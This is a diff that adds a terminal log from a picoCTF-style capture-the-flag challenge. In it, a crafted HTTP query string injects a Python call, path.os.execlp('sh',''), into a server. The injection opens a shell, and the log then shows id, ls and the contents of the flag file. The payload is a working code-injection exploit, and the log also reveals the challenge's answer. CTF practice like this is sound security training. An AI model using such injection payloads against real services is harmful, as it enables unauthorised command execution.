@@ -1,0 +1,16 @@
+root@kali32:~$ nc python.picoctf.com 6364
+GET /index.html?a=b&xxx=x"}+path.os.execlp("sh","")+{"xx":" HTTP/1.1
+
+id
+uid=1005(py4) gid=1006(py4) groups=1006(py4)
+ls
+index.html
+run.sh
+stage1.html
+stage2.html
+stage3.html
+stage4.html
+super_awesome_flag
+task4.py
+cat super_awesome_flag
+kids_dont_code_like_this_at_home
